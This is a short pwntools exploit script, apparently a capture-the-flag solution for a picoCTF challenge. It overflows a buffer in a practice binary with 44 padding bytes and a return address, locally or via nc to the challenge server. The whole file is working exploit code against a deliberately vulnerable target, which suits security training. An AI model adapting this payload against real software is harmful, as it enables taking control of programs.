#!/usr/bin/env python3

from pwn import *
import argparse

if __name__ == "__main__":
	parser = argparse.ArgumentParser(prog="", description="")
	parser.add_argument("-l", "--local", action="store_true")
	parser.add_argument("-r", "--remote", action="store_true")
	args = parser.parse_args()

	if args.local:
		proc = process(["./vuln"])
	elif args.remote:
		proc = process(["nc", "saturn.picoctf.net", "60299"])
	else:
		print("[!] Use either --local or --remote")
		exit()

	proc.sendlineafter(b"Please enter your string: ", b"A" * 44 + p32(0x80491f6))
	warn(proc.recvlines(3)[-1].decode())